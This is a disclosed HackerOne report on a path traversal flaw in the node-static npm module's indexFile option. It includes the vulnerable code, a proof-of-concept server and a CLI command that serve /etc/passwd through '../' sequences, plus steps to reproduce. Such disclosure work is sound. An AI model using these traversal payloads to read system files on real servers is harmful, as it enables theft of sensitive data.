# `indexFile` option passed as an argument to node-server can lead to arbitrary file read

## Report Details
- **Report ID**: 677955
- **URL**: https://hackerone.com/reports/677955
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-08-20T22:16:11.091Z
- **Disclosed**: 2019-12-04T19:42:26.136Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi Guys,

I would like to report Path Traversal vulnerability in `indexFile` parameter passed as an option to`node-server`.
This vulnerability affects both CLI `--indexFile` and `options.indexFile` passed as an argument to `Server.prototype.serveDir` function in `node-static.js`

# Module

**module name:** node-static
**version:** 0.7.11
**npm page:** `https://www.npmjs.com/package/node-static`

## Module Description

a simple, rfc 2616 compliant file streaming module for node

node-static understands and supports conditional GET and HEAD requests. node-static was inspired by some of the other static-file serving modules out there, such as node-paperboy and antinode.

## Module Stats

**~38.000 downloads/week**
**>150.000 downloads/month**

# Vulnerability

`node-static` allows to run static HTTP server with several options available. One of those options is `indexFile`, which allows to point to a specific file served as direcory index when user opens default url where server runs.

Because `node-static` does not restrict what file and from which location can be used as directory index, any of the files available on the machine where `node-static` is running can be used.

If `indexFile` option can be somehow controlled by malicious user, this can lead to arbitrary file read.


## Vulnerability Description

Vulnerability exists, because `indexFile` argument passed as one of the options to `Server.prototype.serveDir` function is not checked against Path Traversal patterns and allows to inject any path. When server is running, HTTP request to server root causes content of the file passed in `indexFile` is returned.

This works both for server run as standalone Node.js application and when server is run from CLI.

Here's vulnerable fragment of the code:

```javascript
// node-static/lib/node-static.js; lines from 52:

Server.prototype.serveDir = function (pathname, req, res, finish) {
    var htmlIndex = path.join(pathname, this.options.indexFile),   //// <-- this.options.indexFile passed "as is"
        that = this;

    fs.stat(htmlIndex, function (e, stat) {
        if (!e) {
            var status = 200;
            var headers = {};
            var originalPathname = decodeURI(url.parse(req.url).pathname);
            if (originalPathname.length && originalPathname.charAt(originalPathname.length - 1) !== '/') {
                return finish(301, { 'Location': originalPathname + '/' });
            } else {
                that.respond(null, status, headers, [htmlIndex], stat, req, res, finish);
            }
        } else {
            // Stream a directory of files as a single file.
            fs.readFile(path.join(pathname, 'index.json'), function (e, contents) {
                if (e) { return finish(404, {}) }
                var index = JSON.parse(contents);
                streamFiles(index.files);
            });
        }
    });
    function streamFiles(files) {
        util.mstat(pathname, files, function (e, stat) {
            if (e) { return finish(404, {}) }
            that.respond(pathname, 200, {}, files, stat, req, res, finish);
        });
    }
};

```

Here's sample Node.js application using `node-static` as HTTP server, with `indexFile` option set to arbitrary file:

```javascript
'use strict'

const s = require('node-static');

const options = {
    indexFile: '../../../../../../../etc/passwd'
};

const file = new s.Server('./', options);

require('http').createServer(function (request, response) {
    request.addListener('end', function () {
        //
        // Serve files!
        //
        file.serve(request, response);
    }).resume();
}).listen(8080);
```

When it's run and `http://127.0.0.1:8080` ur is accessed in the browser, file is being downloaded:

{F560591}

The content of the downloaded file:

{F560592}


We can get the same result when `node-static` server is run from CLI:

{F560593}


This time, server was created with following command:

```
$ ./node_modules/node-static/bin/cli.js --indexFile ../../../../../../etc/passwd
```



## Steps To Reproduce:

- install `node-static` with `npm i node-static` command
- in the folder with `./node_modules`, run following command (on Linux or macOS):

```
$ ./node_modules/node-static/bin/cli.js --indexFile ../../../../../../etc/passwd
```

- ensure you put enough `../` sequences to reach root folder (`/`) on your machine, depending on how deep your `node_modules` folder is located
- with browser of your choice, navigate to `http://127.0.0.1:8080`. Browser should start downloading `/etc/passwd` file.



## Supporting Material/References:

This vulnerability was found and verified with following configuration:

- macOS 10.14.6
- Node 10.16.0
- npm 6.9.0

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Stay Safe,

bl4de

## Impact

Arbitrary File Read

## Attachments
- 2.png
- 3.png
- 1.png
